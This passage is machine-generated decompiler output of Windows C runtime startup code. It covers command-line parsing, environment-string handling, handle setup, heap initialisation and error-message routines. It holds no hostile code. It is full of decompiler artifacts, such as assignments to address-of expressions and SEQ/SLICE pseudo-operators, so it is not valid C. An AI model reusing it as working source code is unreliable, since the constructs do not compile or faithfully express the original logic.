		}
		if (eax_107.u2->u0 == 0x00)
			break;
		if (edi_178 != 0x00)
		{
			edi_178.u0->dw0000 = esi_127;
			&edi_178.u0->dw0000 = &edi_178.u0->dw0004;
			dwArg08 = edi_178;
		}
		++*dwArg10;
l0040A728:
		word32 dwArg04_572 = 0x01;
		uint32 ebx_852 = 0x00;
		while (true)
		{
			byte bl_237 = (byte) ebx_852;
			if (eax_107.u2->u0 != 0x5C)
				break;
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
			ebx_852 = SEQ(SLICE(ebx_852 + 0x01, word24, 8), bl_237 + 0x01);
		}
		uint32 ebx_268 = ebx_852;
		if (eax_107.u2->u0 == 0x22)
		{
			if ((bl_237 & 0x01) == 0x00)
			{
				if (dwArg14_549 != 0x00)
				{
					Eq_2 edx_247 = &eax_107.u5->b0001;
					if (eax_107.u5->b0001 != 0x22)
						goto l0040A758;
					eax_107 = edx_247;
				}
				else
				{
l0040A758:
					dwArg04_572 = 0x00;
				}
				edi_178 = dwArg08;
				dwArg14_549 = (uint32) (int8) (dwArg14_549 == 0x00);
			}
			ebx_268 = ebx_852 >> 0x01;
		}
		word32 ebx_273 = ebx_268 - 0x01;
		if (ebx_268 != 0x00)
		{
			word32 ebx_278 = ebx_273 + 0x01;
			do
			{
				if (esi_127 != null)
				{
					esi_127->b0000 = 0x5C;
					++esi_127;
				}
				++*dwArg14;
				--ebx_278;
			} while (ebx_278 != 0x00);
		}
		byte dl_309 = eax_107.u2->u0;
		if (dl_309 != 0x00 && (dwArg14_549 != 0x00 || dl_309 != 0x20 && dl_309 != 0x09))
		{
			if (dwArg04_572 != 0x00)
			{
				if (esi_127 != null)
				{
					if ((g_a494D61[(word32) dl_309] & 0x04) != 0x00)
					{
						esi_127->b0000 = dl_309;
						++*dwArg14;
						++esi_127;
						&eax_107.u0->dw0000 = &eax_107.u5->b0001;
					}
					esi_127->b0000 = eax_107.u2->u0;
					++esi_127;
				}
				else if ((g_a494D61[(word32) dl_309] & 0x04) != 0x00)
				{
					++*dwArg14;
					&eax_107.u0->dw0000 = &eax_107.u5->b0001;
				}
				++*dwArg14;
			}
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
			goto l0040A728;
		}
		if (esi_127 != null)
		{
			esi_127->b0000 = 0x00;
			++esi_127;
		}
		++*dwArg14;
	}
	if (edi_178 != 0x00)
		edi_178.u0->dw0000 = 0x00;
	++*dwArg10;
}

// 0040A7F0: Register Eq_2 fn0040A7F0(Register out Eq_5074 ecxOut)
// Called from:
//      Win32CrtStartup
Eq_2 fn0040A7F0(union Eq_5074 & ecxOut)
{
	Eq_5074 ecx;
	Eq_2 eax_130;
	Eq_5074 dwLoc04_286 = ecx;
	word32 eax_9 = g_dw493AA8;
	Eq_2 esi_132 = 0x00;
	Eq_2 edi_108 = 0x00;
	if (eax_9 == 0x00)
	{
		Eq_2 eax_32 = GetEnvironmentStringsW();
		esi_132 = eax_32;
		if (eax_32 != 0x00)
		{
			g_dw493AA8 = 0x01;
l0040A847:
			if (esi_132 != 0x00)
			{
l0040A857:
				Eq_2 eax_151 = esi_132;
				if (esi_132.u2->u1 != 0x00)
				{
					do
					{
						do
						{
							Eq_7379 eax_154 = &eax_151.u5->b0001;
							&eax_151.u0->dw0000 = &eax_154.u0->t0001.u0;
						} while (eax_154.u0->t0001.u0 != 0x00);
						eax_151 = eax_154 + 0x03;
					} while (Mem147[eax_154 + 0x03:word16] != 0x00);
				}
				Eq_5074 eax_184 = (eax_151 - esi_132 >> 0x01) + 0x01;
				Eq_2 ebx_175 = 0x00;
				dwLoc04_286 = eax_184;
				Eq_2 eax_198 = WideCharToMultiByte(0x00, 0x00, esi_132, eax_184, 0x00, 0x00, 0x00, 0x00);
				if (eax_198 != 0x00)
				{
					Eq_2 eax_205 = fn00409613(eax_198);
					Eq_2 dwLoc08_307 = eax_205;
					if (eax_205 != 0x00)
					{
						if (WideCharToMultiByte(0x00, 0x00, esi_132, eax_184, eax_205, eax_198, 0x00, 0x00) == 0x00)
						{
							word32 ebp_477;
							dwLoc08_307 = fn004095E4(eax_205, out ebp_477);
						}
						ebx_175 = dwLoc08_307;
					}
				}
				FreeEnvironmentStringsW(esi_132);
				eax_130 = ebx_175;
				goto l0040A91B;
			}
			Eq_2 eax_137 = GetEnvironmentStringsW();
			esi_132 = eax_137;
			if (eax_137 != 0x00)
				goto l0040A857;
l0040A919:
			&eax_130.u0->dw0000 = 0x00;
			goto l0040A91B;
		}
		Eq_2 eax_36 = GetEnvironmentStrings();
		edi_108 = eax_36;
		if (eax_36 == 0x00)
			goto l0040A919;
		g_dw493AA8 = 0x02;
	}
	else
	{
		if (eax_9 == 0x01)
			goto l0040A847;
		if (eax_9 != 0x02)
			goto l0040A919;
	}
	if (edi_108 == 0x00)
	{
		Eq_2 eax_45 = GetEnvironmentStrings();
		edi_108 = eax_45;
		if (eax_45 == 0x00)
			goto l0040A919;
	}
	Eq_2 eax_55 = edi_108;
	if (edi_108.u2->u0 != 0x00)
	{
		do
		{
			do
				&eax_55.u0->dw0000 = &eax_55.u5->b0001;
			while (eax_55.u2->u0 != 0x00);
			++eax_55;
		} while (Mem51[eax_55 + 0x01:byte] != 0x00);
	}
	Eq_2 esi_110;
	word32 eax_69 = eax_55 - edi_108;
	Eq_2 eax_80 = fn00409613(eax_69 + 0x01);
	if (eax_80 == 0x00)
		&esi_110.u0->dw0000 = 0x00;
	else
		fn00407C00(eax_80, edi_108, eax_69 + 0x01, out esi_110, out edi_108);
	FreeEnvironmentStringsA(edi_108);
	eax_130 = esi_110;
l0040A91B:
	ecxOut = dwLoc04_286;
	return eax_130;
}

// 0040A922: void fn0040A922()
// Called from:
//      Win32CrtStartup
void fn0040A922()
{
	Eq_7474 tLoc44;
	Eq_2 eax_20 = fn00409613(0x0100);
	Eq_2 esi_28 = eax_20;
	if (eax_20 == 0x00)
		fn0040854E(0x1B);
	g_t494B20.u0 = (BOOL) eax_20;
	g_t494C20.u0 = 0x20;
	Eq_2 eax_287 = (word32) eax_20 + 0x0100;
	while (esi_28 < eax_287)
	{
		&((word32) esi_28 + 4)->u0->dw0000 = 0x00;
		esi_28.u0->dw0000 = ~0x00;
		&((word32) esi_28 + 5)->u0->dw0000 = 0x0A;
		&esi_28.u0->dw0000 = (word32) esi_28 + 8;
		&eax_287.u0->dw0000 = g_t494B20.u0->a00C4 + 0x0F;
	}
	GetStartupInfoA(&tLoc44);
	if (tLoc44.cbReserved2 != 0x00)
	{
		Eq_7524 eax_63 = tLoc44.lpReserved2;
		if (eax_63 != 0x00)
		{
			Eq_2 esi_115 = eax_63.u0->u0;
			word32 ebp_126 = eax_63 + 4;
			word32 ebx_121 = esi_115 + (eax_63 + 4);
			if (esi_115 >= 0x0800)
				&esi_115.u0->dw0000 = 0x0800;
			if (g_t494C20.u0 < esi_115)
			{
				word32 * edi_101 = g_a494B24;
				do
				{
					Eq_2 eax_104 = fn00409613(0x0100);
					if (eax_104 == 0x00)
					{
						&esi_115.u0->dw0000 = g_t494C20.u0;
						break;
					}
					g_t494C20.u0 = &g_t494C20.u0->ptr0014 + 3;
					*edi_101 = (word32) eax_104;
					Eq_2 ecx_103 = (word32) eax_104 + 0x0100;
					while (eax_104 < ecx_103)
					{
						&((word32) eax_104 + 4)->u0->dw0000 = 0x00;
						eax_104.u0->dw0000 = ~0x00;
						&((word32) eax_104 + 5)->u0->dw0000 = 0x0A;
						&eax_104.u0->dw0000 = (word32) eax_104 + 8;
						ecx_103 = *edi_101 + 0x0100;
					}
					++edi_101;
				} while (g_t494C20.u0 < esi_115);
			}
			Eq_2 edi_114 = 0x00;
			if (esi_115 > 0x00)
			{
				do
				{
					Eq_2 eax_123 = *ebx_121.u0;
					if (eax_123 != ~0x00)
					{
						byte cl_127 = *ebp_126;
						if ((cl_127 & 0x01) != 0x00 && ((cl_127 & 0x08) != 0x00 || GetFileType(eax_123) != 0x00))
						{
							struct Eq_7700 * eax_156 = (char *) &(*((char *) &g_t494B20.u0 + (edi_114 >> 0x05) * 0x04))->u0 + (edi_114 & 0x1F) * 0x08;
							eax_156->dw0000 = *ebx_121.u0;
							eax_156->b0004 = *ebp_126;
						}
					}
					&edi_114.u0->dw0000 = &edi_114.u5->b0001;
					++ebp_126;
					ebx_121 += 0x04;
				} while (edi_114 < esi_115);
			}
		}
	}
	int32 ebx_174;
	for (ebx_174 = 0x00; ebx_174 < 0x03; ++ebx_174)
	{
		Eq_2 eax_179 = g_t494B20.u0;
		struct Eq_7588 * esi_182 = eax_179.u0 + (ebx_174 * 0x08) / 0x00001000;
		if (eax_179.u0[ebx_174 * 0x08 / 0x00001000] == ~0x00)
		{
			Eq_2 eax_199;
			esi_182->b0004 = 0x81;
			if (ebx_174 == 0x00)
				&eax_199.u0->dw0000 = ~0x09;
			else
				eax_199 = 0x00 - (ebx_174 != 0x01) + ~0x0A;
			Eq_2 eax_210 = GetStdHandle(eax_199);
			if (eax_210 != ~0x00)
			{
				Eq_2 eax_217 = GetFileType(eax_210);
				if (eax_217 == 0x00)
					goto l0040AA9E;
				esi_182->t0000.u0 = (BOOL) eax_210;
				if ((eax_217 & 0xFF) == 0x02)
					goto l0040AA9E;
				if ((eax_217 & 0xFF) == 0x03)
					esi_182->b0004 |= 0x08;
			}
			else
			{
l0040AA9E:
				esi_182->b0004 |= 0x40;
			}
		}
		else
			esi_182->b0004 |= 0x80;
	}
	SetHandleCount(g_t494C20.u0);
}

// 0040AACD: Register word32 fn0040AACD(Stack word32 dwArg04)
// Called from:
//      Win32CrtStartup
word32 fn0040AACD(word32 dwArg04)
{
	Eq_2 eax_16 = HeapCreate((uint32) (int8) (dwArg04 == 0x00), 0x1000, 0x00);
	g_t494B04.u0 = (BOOL) eax_16;
	if (eax_16 == 0x00)
		return 0x00;
	if (fn0040B575() != 0x00)
		return 0x01;
	HeapDestroy(g_t494B04.u0);
	return 0x00;
}

// 0040ACDC: void fn0040ACDC()
// Called from:
//      fn0040854E
//      fn00408573
void fn0040ACDC()
{
	word32 eax_5 = g_dw493928;
	if (eax_5 == 0x01 || eax_5 == 0x00 && g_dw412914 == 0x01)
	{
		fn0040AD15(252);
		<anonymous> * eax_26 = g_ptr493AAC;
		if (eax_26 != null)
		{
			word32 ecx_36;
			word32 edx_38;
			eax_26();
		}
		fn0040AD15(0xFF);
	}
}

// 0040AD15: Register Eq_2 fn0040AD15(Stack Eq_2 tArg04)
// Called from:
//      fn0040854E
//      fn00408573
//      fn0040ACDC
Eq_2 fn0040AD15(Eq_2 tArg04)
{
	ptr32 fp;
	Eq_2 edi;
	Eq_1281 tLoc01A8;
	word32 edx_9 = tArg04;
	ui32 ecx_10 = 0x00;
	word32 * eax_14 = g_a412CE8;
	while (edx_9 != *eax_14)
	{
		eax_14 += 2;
		++ecx_10;
		if (eax_14 >= &g_dw412D78)
			break;
	}
	if (edx_9 == g_a412CE8[ecx_10])
	{
		word32 eax_38 = g_dw493928;
		if (eax_38 != 0x01 && (eax_38 != 0x00 || g_dw412914 != 0x01))
		{
			if (edx_9 != 252)
			{
				if (GetModuleFileNameA(0x00, &tLoc01A8, 0x0104) == 0x00)
					edi = fn00407750(&tLoc01A8, 4249020);
				if (fn00407840(&tLoc01A8) > 0x3B)
					fn0040AFC0(fn00407840(&tLoc01A8).u0 + (fp - 0x01E3) / 0x00001000, 0x0040D5B8, (byte (*)[]) 0x03);
				fn00407760(fp - 0xA4, fn00407750(fp - 0xA4, 4248988));
				fn00407760(fp - 0xA4, 4248984);
				fn00407760(fp - 0xA4, *((char *) &g_a412CE8->t0004.u0 + ecx_10 * 0x08));
				fn0040C098();
			}
		}
		else
			WriteFile(GetStdHandle(~0x0B), *((char *) &g_a412CE8->t0004.u0 + ecx_10 * 0x08), fn00407840(*((char *) &g_a412CE8->t0004.u0 + ecx_10 * 0x08)), &tArg04, null);
	}
	return edi;
}

// 0040AE68: Register Eq_2 fn0040AE68(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10, Stack Eq_2 dwArg14, Stack Eq_2 dwArg18, Stack word32 dwArg1C)
// Called from:
//      fn004087D6
//      fn00408C50
Eq_2 fn0040AE68(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10, Eq_2 dwArg14, Eq_2 dwArg18, word32 dwArg1C)
{
	ptr32 fp;
	struct Eq_7901 * fs;
	Eq_4352 tLoc20;
	Eq_2 eax_184;
	ptr32 eax_15 = fs->ptr0000;
	fs->ptr0000 = fp - 20;
	word32 eax_30 = g_dw493AB0;
	if (eax_30 == 0x00)
	{
		if (GetStringTypeW(0x01, 4248144, 0x01, &tLoc20) != 0x00)
			eax_30 = 0x01;
		else
		{
			if (GetStringTypeA(0x00, 0x01, 4248140, 0x01, &tLoc20) == 0x00)
				goto l0040AF9D;
			eax_30 = 0x02;
		}
		g_dw493AB0 = eax_30;
	}
	if (eax_30 == 0x02)
	{
		Eq_2 eax_200 = dwArg18;
		if (dwArg18 == 0x00)
			&eax_200.u0->dw0000 = g_t49393C.u0;
		eax_184 = GetStringTypeA(eax_200, dwArg04, dwArg08, dwArg0C, dwArg10);
l0040AF9F:
		fs->ptr0000 = eax_15;
		return eax_184;
	}
	if (eax_30 == 0x01)
	{
		if (dwArg14 == 0x00)
			&dwArg14.u0->dw0000 = g_t49394C.u0;
		Eq_2 eax_117 = MultiByteToWideChar(dwArg14, (0x00 - (dwArg1C != 0x00) & 0x08) + 0x01, dwArg08, dwArg0C, 0x00, 0x00);
		if (eax_117 != 0x00)
		{
			ui32 eax_125 = eax_117 * 0x02 + 0x03;
			fn00407F60(SEQ(SLICE(eax_125, word24, 8), (byte) eax_125 & 252), 0x00);
			Eq_2 esp_134 = (struct Eq_10346 *) <invalid>;
			esp_134.u0->dwFFFFFFFC = (word32) (eax_117 * 0x02);
			esp_134.u0->dwFFFFFFF8 = 0x00;
			*((word32) esp_134 - 0x0C) = esp_134;
			fn004076F0(*((word32) esp_134 - 0x0C), *((word32) esp_134 - 8), esp_134.u0->dwFFFFFFFC);
			if (esp_134 != 0x00)
			{
				esp_134.u0->dwFFFFFFFC = (word32) eax_117;
				esp_134.u0->dwFFFFFFF8 = (word32) esp_134;
				*((word32) esp_134 - 0x0C) = dwArg0C;
				*((word32) esp_134 - 16) = dwArg08;
				&((word32) esp_134 - 20)->u0->dw0000 = 0x01;
				*((word32) esp_134 - 24) = dwArg14;
				Eq_2 eax_180 = MultiByteToWideChar(*((word32) esp_134 - 24), *((word32) esp_134 - 20), *((word32) esp_134 - 16), *((word32) esp_134 - 0x0C), esp_134.u0->dwFFFFFFF8, esp_134.u0->dwFFFFFFFC);
				if (eax_180 != 0x00)
				{
					esp_134.u0->dwFFFFFFFC = (word32) dwArg10;
					esp_134.u0->dwFFFFFFF8 = (word32) eax_180;
					*((word32) esp_134 - 0x0C) = esp_134;
					*((word32) esp_134 - 16) = dwArg04;
					eax_184 = GetStringTypeW(*((word32) esp_134 - 16), *((word32) esp_134 - 0x0C), esp_134.u0->dwFFFFFFF8, esp_134.u0->dwFFFFFFFC);
					goto l0040AF9F;
				}
			}
		}
	}
l0040AF9D:
	&eax_184.u0->dw0000 = 0x00;
	goto l0040AF9F;
}

// 0040AFC0: Register (ptr32 (arr byte)) fn0040AFC0(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack (ptr32 (arr byte)) dwArg0C)
// Called from:
//      fn00408977
//      fn0040AD15
byte (* fn0040AFC0)[](Eq_2 dwArg04, Eq_2 dwArg08, byte (* dwArg0C)[])
{
	byte (* ecx_126)[] = dwArg0C;
	if (dwArg0C == null)
		return ecx_126;
	byte al_191;
	byte (* ebx_130)[] = dwArg0C;
	Eq_2 esi_189 = dwArg08;
	Eq_2 edi_123 = dwArg04;
	if ((dwArg08 & 0x03) == 0x00)
	{
		ecx_126 = dwArg0C >> 0x02;
		if (dwArg0C >> 0x02 == 0x00)
			goto l0040B005;
	}
	else
	{
		do
		{
			al_191 = esi_189.u2->u0;
			edi_123.u2->u0 = al_191;
			&esi_189.u0->dw0000 = &esi_189.u5->b0001;
			&edi_123.u0->dw0000 = &edi_123.u5->b0001;
			--ecx_126;
			if (ecx_126 == null)
				return ecx_126;
			if (al_191 == 0x00)
			{
				while ((edi_123 & 0x03) != 0x00)
				{
					edi_123.u2->u0 = al_191;
					&edi_123.u0->dw0000 = &edi_123.u5->b0001;
					--ecx_126;
					if (ecx_126 == null)
						return ecx_126;
				}
				ebx_130 = ecx_126;
				ecx_126 >>= 0x02;
				if (ecx_126 != null)
				{
l0040B0A7:
					do
					{
						edi_123.u0->dw0000 = 0x00;
						&edi_123.u0->dw0000 = &edi_123.u0->dw0004;
						--ecx_126;
					} while (ecx_126 != null);
l0040B0B1:
					al_191 = 0x00;
					ebx_130 &= 0x03;
					if (ebx_130 == null)
						return ecx_126;
				}
				do
				{
					edi_123.u2->u0 = al_191;
					&edi_123.u0->dw0000 = &edi_123.u5->b0001;
l0040B03E:
					--ebx_130;
				} while (ebx_130 != null);
				return ecx_126;
			}
		} while ((esi_189 & 0x03) != 0x00);
		ebx_130 = ecx_126;
		ecx_126 >>= 0x02;
		if (ecx_126 >> 0x02 == 0x00)
		{
l0040B000:
			ebx_130 &= 0x03;
			if (ebx_130 == null)
				return ecx_126;
l0040B005:
			do
			{
				al_191 = esi_189.u2->u0;
				edi_123.u2->u0 = al_191;
				&esi_189.u0->dw0000 = &esi_189.u5->b0001;
				&edi_123.u0->dw0000 = &edi_123.u5->b0001;
				if (al_191 == 0x00)
					goto l0040B03E;
				--ebx_130;
			} while (ebx_130 != null);
			return ecx_126;
		}
	}
	do
	{
		Eq_8143 edx_80 = esi_189.u0->dw0000;
		Eq_8147 eax_76 = esi_189.u0->dw0000;
		byte dl_86 = (byte) edx_80;
		byte dh_97 = SLICE(edx_80, byte, 8);
		&esi_189.u0->dw0000 = &esi_189.u0->dw0004;
		if (((~eax_76 ^ (word32) eax_76 + 0x7EFEFEFF) & 0x81010100) != 0x00)
		{
			if (dl_86 != 0x00)
			{
				if (dh_97 != 0x00)
				{
					if ((edx_80 & 0x00FF0000) != 0x00)
					{
						if ((edx_80 & 0xFF000000) != 0x00)
							goto l0040B049;
						edi_123.u0->dw0000 = (word32) edx_80;
					}
					else
						edi_123.u0->dw0000 = (word32) (edx_80 & 0xFFFF);
				}
				else
					edi_123.u0->dw0000 = (word32) (edx_80 & 0xFF);
			}
			else
				edi_123.u0->dw0000 = 0x00;
			&edi_123.u0->dw0000 = &edi_123.u0->dw0004;
			--ecx_126;
			if (ecx_126 != null)
				goto l0040B0A7;
			goto l0040B0B1;
		}
l0040B049:
		edi_123.u0->dw0000 = (word32) edx_80;
		&edi_123.u0->dw0000 = &edi_123.u0->dw0004;
		--ecx_126;
	} while (ecx_126 != null);
	goto l0040B000;
}

// 0040B575: Register Eq_2 fn0040B575()
// Called from:
//      fn0040AACD
Eq_2 fn0040B575()
{
	Eq_2 eax_11 = HeapAlloc(g_t494B04.u0, 0x00, 0x0140);
	g_t493AE0.u0 = (BOOL) eax_11;
	if (eax_11 == 0x00)
		return eax_11;
	g_t493AD8.u0 = 0x00;
	g_dw493ADC = 0x00;
	g_t493AD4.u0 = (BOOL) eax_11;
	g_dw493ACC = 0x10;
	return 0x01;
}

// 0040B5B3: Register Eq_2 fn0040B5B3(Stack Eq_2 dwArg04)
// Called from:
//      fn004095E4
Eq_2 fn0040B5B3(Eq_2 dwArg04)
{
	Eq_2 eax_13 = g_t493AE0.u0;
	Eq_2 ecx_8 = eax_13.u0 + (g_dw493ADC * 0x14) / 0x00001000;
	while (eax_13 < ecx_8)
	{
		if (dwArg04 - (&(eax_13.u0)->dw0004)[2] < 0x00100000)
			return eax_13;
		&eax_13.u0->dw0000 = &eax_13.u0->ptr0014;
	}
	&eax_13.u0->dw0000 = 0x00;
	return eax_13;
}

// 0040B5DE: Register word32 fn0040B5DE(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Register out ptr32 ebpOut)
// Called from:
//      fn004095E4
word32 fn0040B5DE(Eq_2 dwArg04, Eq_2 dwArg08, ptr32 & ebpOut)
{
	ptr32 fp;
	Eq_2 dwArg08_528;
	Eq_2 ebx_20 = dwArg08.u0->dwFFFFFFFC;
	Eq_8337 esi_19 = dwArg08 - *((word32) dwArg04 + 0x0C);
	Eq_2 eax_17 = *((word32) dwArg04 + 16);
	int32 ecx_34 = (&dwArg08.u0->dwFFFFFFFC)[ebx_20 - 0x01];
	struct Eq_8353 * ebp_469 = fp - 4;
	struct Eq_8356 * edx_21 = &dwArg08.u0->dwFFFFFFFC;
	Eq_8358 esi_25 = esi_19 >> 0x0F;
	Eq_2 edi_27 = dwArg08.u0->dwFFFFFFF8;
	int32 ebx_112 = ebx_20 - 0x01;
	word32 * ecx_31 = eax_17.u0 + ((esi_19 >> 0x0F) *s 0x0204 + 0x0144) / 0x00001000;
	int32 dwLoc10_524 = ebx_20 - 0x01;
	dwArg08_528 = dwArg08;
	if (((byte) ecx_34 & 0x01) == 0x00)
	{
		Eq_2 ecx_44 = (ecx_34 >> 0x04) - 0x01;
		dwArg08_528 = ecx_44;
		if (ecx_44 > 0x3F)
			&dwArg08_528.u0->dw0000 = 0x3F;
		if (Mem53[ebx_20 + 0x03 + (dwArg08 + ~0x03):word32] == Mem53[(ebx_20 + 0x07) + (dwArg08 + ~0x03):word32])
		{
			byte cl_85 = (byte) dwArg08_528;
			if (dwArg08_528 < 0x20)
			{
				uint32 edi_88 = ~(0x80000000 >> cl_85);
				&((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x0044))->u0->dw0000 = *((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x0044)) & edi_88;
				word32 ecx_87 = dwArg08_528 + 4 + eax_17;
				Eq_8526 v22_93 = ecx_87.u1->t0000.u1 - 0x01;
				ecx_87.u1->t0000.u1 = (byte) v22_93;
				if (v22_93 == 0x00)
					dwArg04.u0->dw0000 &= edi_88;
			}
			else
			{
				uint32 edi_68 = ~(0x80000000 >> (byte) dwArg08_528 + 0xE0);
				&((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x00C4))->u0->dw0000 = *((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x00C4)) & edi_68;
				word32 ecx_67 = dwArg08_528 + 4 + eax_17;
				byte v25_74 = *ecx_67 - 0x01;
				*ecx_67 = v25_74;
				if (v25_74 == 0x00)
					dwArg04.u0->dw0004 = (word32) (dwArg04.u0->dw0004 & edi_68);
			}
		}
		Mem108[Mem105[ebx_20 + 0x07 + (dwArg08 + ~0x03):word32] + 4:word32] = Mem105[ebx_20 + 0x03 + (dwArg08 + ~0x03):word32];
		Mem114[Mem108[ebx_20 + 0x03 + (dwArg08 + ~0x03):word32] + 8:word32] = Mem108[ebx_20 + 0x07 + (dwArg08 + ~0x03):word32];
		ebx_112 = ebx_20 - 0x01 + ecx_34;
		dwLoc10_524 = ebx_112;
	}
	Eq_8381 edi_118 = ebx_112 >> 0x04;
	Eq_2 edi_119 = edi_118 - 0x01;
	if (edi_118 > 0x40)
		&edi_119.u0->dw0000 = 0x3F;
	if ((edi_27 & 0x01) == 0x00)
	{
		Eq_2 ecx_149 = (edi_27 >> 0x04) - 0x01;
		struct Eq_8356 * edx_142 = &dwArg08.u0->dwFFFFFFFC - edi_27;
		dwArg08_528 = ecx_149;
		if (ecx_149 > 0x3F)
		{
			&dwArg08_528.u0->dw0000 = 0x3F;
			&ecx_149.u0->dw0000 = 0x3F;
		}
		ebx_112 = edi_27.u0 + ebx_112 / 0x00001000;
		dwLoc10_524 = ebx_112;
		edi_119 = (ebx_112 >> 0x04) - 0x01;
		if (edi_119 > 0x3F)
			&edi_119.u0->dw0000 = 0x3F;
		if (ecx_149 != edi_119)
		{
			if (edx_142->ptr0004 == edx_142->ptr0008)
			{
				byte cl_216 = (byte) dwArg08_528;
				if (dwArg08_528 < 0x20)
				{
					uint32 edx_219 = ~(0x80000000 >> cl_216);
					&((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x0044))->u0->dw0000 = *((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x0044)) & edx_219;
					word32 ecx_218 = dwArg08_528 + 4 + eax_17;
					Eq_8526 v28_224 = ecx_218.u1->t0000.u1 - 0x01;
					ecx_218.u1->t0000.u1 = (byte) v28_224;
					if (v28_224 == 0x00)
						dwArg04.u0->dw0000 &= edx_219;
				}
				else
				{
					uint32 edx_195 = ~(0x80000000 >> (byte) dwArg08_528 + 0xE0);
					&((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x00C4))->u0->dw0000 = *((word32) eax_17 + ((esi_19 >> 0x0F) * 0x04 + 0x00C4)) & edx_195;
					word32 ecx_194 = dwArg08_528 + 4 + eax_17;
					Eq_8526 v31_205 = ecx_194.u1->t0000.u1 - 0x01;
					ecx_194.u1->t0000.u1 = (byte) v31_205;
					if (v31_205 == 0x00)
						dwArg04.u0->dw0004 = (word32) (dwArg04.u0->dw0004 & edx_195);
				}
			}
			edx_142->ptr0008->ptr0004 = edx_142->ptr0004;
			edx_142->ptr0004->ptr0008 = edx_142->ptr0008;
		}
		edx_21 = edx_142;
	}
	struct Eq_8413 * esp_377 = fp - 0x24;
	if ((edi_27 & 0x01) != 0x00 || dwArg08_528 != edi_119)
	{
		edx_21->ptr0004 = (ecx_31 + edi_119 * 0x08)[1];
		word32 ecx_267 = ecx_31 + edi_119 * 0x08;
		edx_21->ptr0008 = ecx_267;
		ecx_267->ptr0004 = edx_21;
		edx_21->ptr0004->ptr0008 = edx_21;
		if (edx_21->ptr0004 == edx_21->ptr0008)
		{
			byte cl_279 = Mem271[edi_119 + 4 + eax_17:byte];
			Mem284[edi_119 + 4 + eax_17:byte] = cl_279 + 0x01;
			if (edi_119 < 0x20)
			{
				if (cl_279 == 0x00)
					dwArg04.u0->dw0000 |= 0x80000000 >> (byte) edi_119;
				word32 eax_335 = eax_17 + 0x0044 + (esi_19 >>u 0x0F) * 0x04;
				eax_335.u1->t0000.u0 = (ui32) (eax_335.u1->t0000.u0 | 0x80000000 >> (byte) edi_119);
			}
			else
			{
				if (cl_279 == 0x00)
					dwArg04.u0->dw0004 = (word32) (dwArg04.u0->dw0004 | 0x80000000 >> (byte) edi_119 - 0x20);
				word32 eax_309 = eax_17 + 0xC4 + (esi_19 >>u 0x0F) * 0x04;
				eax_309.u1->t0000.u0 = (ui32) (eax_309.u1->t0000.u0 | 0x80000000 >> (byte) edi_119 - 0x20);
			}
			ebx_112 = dwLoc10_524;
		}
	}
	edx_21->dw0000 = ebx_112;
	edx_21[(ebx_112 - 4) / 0x0C] = (struct Eq_8356) ebx_112;
	word32 v36_362 = *ecx_31 - 0x01;
	*ecx_31 = v36_362;
	if (v36_362 != 0x00)
	{
l0040B904:
		word32 ebx_510 = esp_377->dw0008;
		ebpOut = ebp_469->ptr0000;
		return ebx_510;
	}
	Eq_2 eax_429;
	Eq_2 eax_366 = g_t493AD8.u0;
	if (eax_366 != 0x00)
	{
		VirtualFree(((word32) eax_366 + 0x0C)->u0 + (g_t493AD0.u0 << 0x0F) / 0x00001000, 0x8000, 0x4000);
		Eq_2 eax_395 = g_t493AD8.u0;
		&((word32) eax_395 + 8)->u0->dw0000 = *((word32) eax_395 + 8) | 0x80000000 >> g_t493AD0;
		*((word32) (&g_t493AD8.u0->dw0004)[3] + (g_t493AD0.u0 * 0x04 + 0x00C4)) = 0x00;
		Eq_2 eax_409 = (&g_t493AD8.u0->dw0004)[3];
		--eax_409.u0->b0043;
		Eq_2 eax_412 = g_t493AD8.u0;
		if (((word32) eax_412 + 16)->u0->b0043 == 0x00)
		{
			eax_412.u0->dw0004 = (word32) (eax_412.u0->dw0004 & ~0x01);
			&eax_412.u0->dw0000 = g_t493AD8.u0;
		}
		if (*((word32) eax_412 + 8) == ~0x00)
		{
			VirtualFree((&eax_412.u0->dw0004)[2], 0x00, 0x8000);
			HeapFree(g_t494B04.u0, 0x00, (&g_t493AD8.u0->dw0004)[3]);
			Eq_2 eax_457 = g_t493AD8.u0;
			ebp_469 = fn00407FE0(eax_457, &eax_457.u0->ptr0014, g_t493AE0.u0 + ((g_dw493ADC * 0x14 - eax_457) - 20) / 0x00001000, out esi_25);
			&eax_429.u0->dw0000 = ebp_469->t0008.u0;
			--g_dw493ADC;
			esp_377 = fp - 0x30;
			if (eax_429 > g_t493AD8.u0)
				eax_429 -= 0x14;
			g_t493AD4.u0 = g_t493AE0.u0;
l0040B8F9:
			g_t493AD8.u0 = (BOOL) eax_429;
			g_t493AD0.u0 = (int32) esi_25;
			goto l0040B904;
		}
	}
	esp_377 = fp - 0x24;
	eax_429 = dwArg04;
	goto l0040B8F9;
}

// 0040B909: Register ptr32 fn0040B909(Stack Eq_2 dwArg04)
// Called from:
//      fn00409651
ptr32 fn0040B909(Eq_2 dwArg04)
{
	uint32 dwLoc10_571;
	uint32 esi_183;
	uint32 dwLoc0C_572;
	int32 ecx_25 = (word32) dwArg04 + 23 & ~0x0F;
	Eq_2 edx_10 = g_t493AE0.u0;
	int32 ecx_28 = (ecx_25 >> 0x04) - 0x01;
	Eq_2 edi_21 = edx_10.u0 + (g_dw493ADC * 0x14) / 0x00001000;
	byte cl_40 = (byte) ecx_28;
	if (ecx_28 < 0x20)
	{
		esi_183 = ~0x00 >> cl_40;
		dwLoc0C_572 = ~0x00;
		dwLoc10_571 = esi_183;
	}
	else
	{
		esi_183 = 0x00;
		dwLoc10_571 = 0x00;
		dwLoc0C_572 = ~0x00 >> (byte) ecx_28 + 0xE0;
	}
	Eq_2 eax_49 = g_t493AD4.u0;
